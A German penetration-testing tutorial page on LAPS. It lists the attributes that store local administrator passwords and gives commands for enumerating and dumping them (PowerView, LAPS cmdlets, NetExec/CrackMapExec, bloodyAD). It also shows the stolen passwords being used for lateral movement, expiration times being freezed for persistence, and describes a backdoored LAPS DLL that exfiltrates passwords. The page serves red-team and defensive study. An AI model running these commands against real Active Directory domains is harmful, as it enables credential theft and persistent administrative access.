# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Es gibt derzeit **2 LAPS-Varianten**, die du bei einer Assessment antreffen kannst:

- **Legacy Microsoft LAPS**: speichert das lokale Administrator-Passwort in **`ms-Mcs-AdmPwd`** und die Ablaufzeit in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (seit den Updates vom April 2023 in Windows integriert): kann weiterhin den Legacy-Modus emulieren, verwendet im nativen Modus jedoch **`msLAPS-*`**-Attribute, unterstützt **password encryption**, **password history** und **DSRM password backup** für Domain Controller.

LAPS ist dafür gedacht, **lokale Administrator-Passwörter** zu verwalten, indem sie auf Domain-joined-Computern **eindeutig, randomisiert und häufig geändert** werden. Wenn du diese Attribute lesen kannst, kannst du normalerweise **als lokaler Admin pivoten** auf den betroffenen Host. In vielen Umgebungen ist der interessante Teil nicht nur das Lesen des Passworts selbst, sondern auch das Finden von **wer Zugriff auf die Passwort-Attribute delegiert bekommen hat**.

### Legacy Microsoft LAPS attributes

In den Computerobjekten der Domain führt die Implementierung von Legacy Microsoft LAPS zur Ergänzung von zwei Attributen:

- **`ms-Mcs-AdmPwd`**: **Klartext-Administratorpasswort**
- **`ms-Mcs-AdmPwdExpirationTime`**: **Ablaufzeit des Passworts**

### Windows LAPS attributes

Native Windows LAPS fügt Computerobjekten mehrere neue Attribute hinzu:

- **`msLAPS-Password`**: Klartext-Passwort-Blob, der als JSON gespeichert wird, wenn encryption nicht aktiviert ist
- **`msLAPS-PasswordExpirationTime`**: geplante Ablaufzeit
- **`msLAPS-EncryptedPassword`**: verschlüsseltes aktuelles Passwort
- **`msLAPS-EncryptedPasswordHistory`**: verschlüsselte Passwort-Historie
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: verschlüsselte DSRM-Passwortdaten für Domain Controller
- **`msLAPS-CurrentPasswordVersion`**: GUID-basierte Versionsverfolgung, die von der neueren rollback-detection-Logik verwendet wird (Windows Server 2025 forest schema)

Wenn **`msLAPS-Password`** lesbar ist, enthält der Wert ein JSON-Objekt mit dem Kontonamen, dem Update-Zeitpunkt und dem Klartext-Passwort, zum Beispiel:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Prüfen, ob aktiviert
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Du könntest die **raw LAPS policy herunterladen** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` und dann **`Parse-PolFile`** aus dem [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package verwenden, um diese Datei in ein menschenlesbares Format zu konvertieren.

### Legacy Microsoft LAPS PowerShell cmdlets

Wenn das legacy LAPS module installiert ist, sind die folgenden cmdlets normalerweise verfügbar:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS wird mit einem neuen PowerShell-Modul und neuen cmdlets ausgeliefert:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Einige operative Details sind hier wichtig:

- **`Get-LapsADPassword`** behandelt automatisch **legacy LAPS**, **clear-text Windows LAPS** und **encrypted Windows LAPS**.
- Wenn das Passwort verschlüsselt ist und du es **lesen**, aber nicht **decrypt** kannst, gibt das Cmdlet Metadaten zurück, aber nicht das clear-text Passwort.
- **Password history** ist nur verfügbar, wenn **Windows LAPS encryption** aktiviert ist.
- Auf Domain Controllern kann die zurückgegebene Quelle **`EncryptedDSRMPassword`** sein.

### PowerView / LDAP

**PowerView** kann auch verwendet werden, um herauszufinden, **wer das Passwort lesen kann und es zu lesen**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Wenn **`msLAPS-Password`** lesbar ist, parse das zurückgegebene JSON und extrahiere **`p`** für das Passwort und **`n`** für den verwalteten lokalen Admin-Account-Namen.

### Linux / remote tooling

Modernes tooling unterstützt sowohl das ältere Microsoft LAPS als auch Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Hinweise:

- Neuere **NetExec**-Builds unterstützen **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** und **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** ist für das **Legacy Microsoft LAPS** unter Linux weiterhin nützlich, unterstützt aber nur **`ms-Mcs-AdmPwd`**.
- Wenn die Umgebung **encrypted Windows LAPS** verwendet, reicht ein einfaches LDAP-Read nicht aus; du musst außerdem ein **authorized decryptor** sein oder einen unterstützten decrypt path missbrauchen.

### Directory synchronization abuse

Wenn du statt direktem Read-Zugriff auf jedes Computerobjekt **directory synchronization**-Rechte auf Domänenebene hast, kann LAPS trotzdem interessant sein.

Die Kombination aus **`DS-Replication-Get-Changes`** mit **`DS-Replication-Get-Changes-In-Filtered-Set`** oder **`DS-Replication-Get-Changes-All`** kann verwendet werden, um **confidential / RODC-filtered** Attribute wie das Legacy-Attribut **`ms-Mcs-AdmPwd`** zu synchronisieren. BloodHound modelliert dies als **`SyncLAPSPassword`**. Siehe [DCSync](dcsync.md) für den Hintergrund zu Replikationsrechten.

## LAPSToolkit

Das [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) erleichtert die Enumeration von LAPS mit mehreren Funktionen.\
Eine davon ist das Parsen von **`ExtendedRights`** für **alle Computer mit aktiviertem LAPS.** Dadurch werden **Gruppen** angezeigt, die speziell dafür **delegiert wurden, LAPS-Passwörter zu lesen**, was oft Benutzer in geschützten Gruppen sind.\
Ein **Konto**, das einen Computer einer Domäne **hinzugefügt** hat, erhält `All Extended Rights` über diesen Host, und dieses Recht gibt dem **Konto** die Fähigkeit, **Passwörter zu lesen**. Die Enumeration kann ein Benutzerkonto aufzeigen, das das LAPS-Passwort auf einem Host lesen kann. Das kann uns helfen, **spezifische AD-Benutzer zu identifizieren**, die LAPS-Passwörter lesen können.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping von LAPS Passwords With NetExec / CrackMapExec

Wenn du kein interaktives PowerShell hast, kannst du dieses Privileg remote über LDAP missbrauchen:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Dies speichert alle LAPS-Secrets, die der Benutzer lesen kann, und ermöglicht es dir, dich lateral mit einem anderen lokalen Administratorpasswort zu bewegen.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistenz

### Ablaufdatum

Sobald man admin ist, ist es möglich, die **Passwörter zu erhalten** und eine Maschine daran zu **hindern**, ihr **Passwort** zu **aktualisieren**, indem man das Ablaufdatum in die Zukunft **setzt**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS verwendet stattdessen **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Das Passwort wird weiterhin rotiert, wenn ein **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** verwendet oder wenn **Do not allow password expiration time longer than required by policy** aktiviert ist.

### Wiederherstellen historischer Passwörter aus AD-Backups

Wenn **Windows LAPS encryption + password history** aktiviert ist, können gemountete AD-Backups zu einer zusätzlichen Quelle für secrets werden. Wenn du auf einen gemounteten AD-Snapshot zugreifen und **recovery mode** verwenden kannst, kannst du ältere gespeicherte Passwörter abfragen, ohne mit einem live DC zu sprechen.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Dies ist meist relevant bei **AD backup theft**, **offline forensics abuse** oder **disaster-recovery media access**.

### Backdoor

Der ursprüngliche Quellcode für legacy Microsoft LAPS kann [hier](https://github.com/GreyCorbel/admpwd) gefunden werden, daher ist es möglich, eine Backdoor in den Code einzubauen (zum Beispiel innerhalb der Methode `Get-AdmPwdPassword` in `Main/AdmPwd.PS/Main.cs`), die auf irgendeine Weise **neue Passwörter exfiltrieren oder irgendwo speichern** würde.

Kompiliere dann die neue `AdmPwd.PS.dll` und lade sie auf die Maschine unter `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` hoch (und ändere die modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
